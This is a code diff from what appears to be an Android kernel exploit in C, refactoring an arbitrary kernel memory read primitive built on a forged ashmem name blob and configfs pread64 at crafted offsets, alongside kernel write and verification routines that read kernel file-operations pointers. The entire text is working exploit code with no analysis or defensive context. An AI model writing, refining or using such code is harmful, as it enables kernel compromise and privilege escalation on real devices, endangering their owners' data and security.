@@ -7,12 +7,14 @@
 #include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <limits.h>
 #include <stdio.h>
 #include <string.h>
 #include <sys/ioctl.h>
 #include <sys/stat.h>
 #include <unistd.h>
 
+#include "04_fake_kernel_objects.h"
 #include "08_ashmem_configfs_rw.h"
 #include "90_diagnostic_checkpoint.h"
 
@@ -22,6 +24,9 @@
 #define OSS_ASHMEM_SET_NAME 0x41007701UL
 #define OSS_CONFIGFS_CONTROL_LEN 0x80
 #define OSS_CONFIGFS_COUNT 0x6d6873612f766564ULL /* "dev/ashm" */
+
+_Static_assert(OSS_CONFIGFS_COUNT <= INT64_MAX,
+               "configfs read position must fit off_t");
 
 static char g_ashmem_path[OSS_ASHMEM_PATH_SIZE] = "/dev/ashmem";
 static int g_ashmem_path_state;
@@ -135,69 +140,60 @@ static int set_ashmem_name_blob(int fd, const unsigned char *src, size_t len) {
   return 0;
 }
 
-/* Smallest value >= value whose eight bytes are all nonzero. The old
- * 256-offset scan could not repair a zero in a higher byte. */
-static uint64_t next_nonzero_bytes(uint64_t value) {
-  for (int shift = 56; shift >= 0; shift -= 8) {
-    if (((value >> shift) & 0xffU) == 0) {
-      uint64_t lower = (1ULL << shift) - 1;
-      return value + (1ULL << shift) - (value & lower) +
-             (0x0101010101010101ULL & lower);
-    }
-  }
-  return value;
-}
+struct configfs_read_plan {
+  uint64_t page;
+  uint64_t offset;
+  uint64_t kernel_check_len;
+};
 
-int oss_kernel_read(int fd, uint64_t target_addr, void *buf, size_t len) {
-
-  unsigned char control[OSS_CONFIGFS_CONTROL_LEN];
-  uint64_t offset = 0;
-  int configured = 0;
-  if (len >= OSS_CONFIGFS_COUNT) {
+static int make_configfs_read_plan(uint64_t target_addr, size_t len,
+                                   struct configfs_read_plan *plan) {
+  if (!plan || len == 0 || len >= OSS_CONFIGFS_COUNT || len > SSIZE_MAX ||
+      target_addr > UINT64_MAX - (len - 1)) {
     errno = EOVERFLOW;
     return 0;
   }
-  uint64_t base_page = target_addr - (OSS_CONFIGFS_COUNT - len);
-  uint64_t page = base_page;
-  for (unsigned int attempt = 0; attempt < 0x100; attempt++) {
-    page = next_nonzero_bytes(page);
-    uint64_t displacement = page - base_page;
-    if (displacement > OSS_CONFIGFS_COUNT - len - 1) {
-      break;
-    }
-    uint64_t candidate_offset = OSS_CONFIGFS_COUNT - len - displacement;
-    memset(control, 1, sizeof(control));
-    memcpy(control + 0x05, &page, sizeof(page));
-    memset(control + 0x15, 0, 0x34);
-    errno = 0;
-    if (set_ashmem_name_blob(fd, control, sizeof(control)) == 0) {
-      offset = candidate_offset;
-      configured = 1;
-      if (displacement >= 0x100) {
-        fprintf(stderr,
-                "[aar_aaw] extended read plan addr=%016llx len=%zu "
-                "displacement=%llu\n",
-                (unsigned long long)target_addr, len,
-                (unsigned long long)displacement);
-      }
-      break;
-    }
-    if (page == UINT64_MAX) {
-      break;
-    }
-    page++;
-  }
-  if (!configured) {
+
+  plan->offset = OSS_CONFIGFS_COUNT - len;
+  plan->page = target_addr - plan->offset;
+  plan->kernel_check_len = OSS_CONFIGFS_COUNT - plan->offset;
+
+  if (plan->offset > INT64_MAX ||
+      plan->page + plan->offset != target_addr ||
+      plan->kernel_check_len != len) {
     errno = EOVERFLOW;
+    return 0;
+  }
+  return 1;
+}
+
+int oss_kernel_read(int fd, uint64_t target_addr, void *buf, size_t len) {
+  struct configfs_read_plan plan;
+  unsigned char control[OSS_CONFIGFS_CONTROL_LEN];
+  if (!buf || !make_configfs_read_plan(target_addr, len, &plan)) {
     fprintf(stderr,
-            "[aar_aaw] configure read(fd=%d, addr=%016llx, len=%zu) failed "
+            "[aar_aaw] unsafe read plan rejected fd=%d addr=%016llx len=%zu "
             "errno=%d(%s)\n",
             fd, (unsigned long long)target_addr, len, errno, strerror(errno));
     return 0;
   }
 
+  memset(control, 1, sizeof(control));
+  memcpy(control + 0x05, &plan.page, sizeof(plan.page));
+  memset(control + 0x15, 0, 0x34);
   errno = 0;
-  ssize_t n = pread64(fd, buf, len, (off_t)offset);
+  if (set_ashmem_name_blob(fd, control, sizeof(control)) != 0) {
+    int saved_errno = errno;
+    fprintf(stderr,
+            "[aar_aaw] configure read(fd=%d, addr=%016llx, len=%zu) failed "
+            "errno=%d(%s)\n",
+            fd, (unsigned long long)target_addr, len, saved_errno,
+            strerror(saved_errno));
+    return 0;
+  }
+
+  errno = 0;
+  ssize_t n = pread64(fd, buf, len, (off_t)plan.offset);
   if (n != (ssize_t)len) {
     int saved_errno = errno;
     fprintf(stderr,
@@ -267,7 +263,7 @@ int oss_kernel_write64(int fd, uint64_t target_addr, uint64_t value) {
 int oss_verify_kernel_access_ex(int fd, uint64_t ashmem_misc_fops_addr,
                                 uint64_t page_base, int *landed) {
   oss_diag_checkpoint("aar-verify-start");
-  uint64_t expect = page_base | 0x1180ULL;
+  uint64_t expect = page_base | OSS_PRIMARY_FOPS_LIVE_OFFSET;
   uint64_t got = UINT64_MAX;
   if (!oss_kernel_read(fd, ashmem_misc_fops_addr, &got, sizeof(got))) {
     return 0;
